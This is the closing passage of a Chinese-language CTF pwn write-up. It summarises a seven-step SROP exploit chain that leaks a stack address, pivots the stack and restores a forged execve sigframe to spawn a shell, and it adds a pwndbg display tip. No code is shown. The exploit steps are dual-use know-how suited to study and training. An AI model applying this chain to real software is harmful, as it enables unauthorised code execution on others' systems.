此时再执行ret指令，便会触发syscall，因为rax值为15，那么这个系统调用为sigreturn，便会恢复我们在新的栈顶构造的execve sigFrame，从而最终getshell：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t010253d0a4d09d53c8.jpg)

经过千难万险，我们总算getshell了，最后的最后我总结一下这道题的思路：

1. 首先打三个重启程序read流程的gadget进来

2. 第一个read gadget用于接收对第二个read gadget的覆盖，从而将第二个read gadget覆盖成write gadget

3. 利用变为write的gadget打印出栈上某地址

4. 触发第三个read gadget，读入一个用于恢复成read sigFrame，其目的是用于将栈顶迁移至刚刚泄露的栈地址处

5. 传入sigreturn gadget，用于触发刚刚传入的read sigFrame，从而在新的栈顶开始read

6. 在新的栈顶传入read gadget和execve sigFrame，此时执行完成会再次开启read

7. 传入sigreturn gadget，用于恢复execve sigFrame，从而getshell

感谢各位读者读到这里，感谢所有参考链接中的各位作者让我明晰SROP攻击。

最后额外补充一点小技巧：

pwndbg总会把内存一样的地址省略号忽略掉，类似如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01e7395d306c259456.png)

但这个很影响我们看到具体内存的内容，总是需要脑补，怎么办呢？

我找到了pwndbg的源码，读者可在.gdbinit中看到相应的地址，然后在command/文件夹的telescope.py中，可以看到“ Collapse repeating values”字样，于是找到111行将“if not skip”改为“if skip”，此时就能完整展现内存样貌而不省略显示了
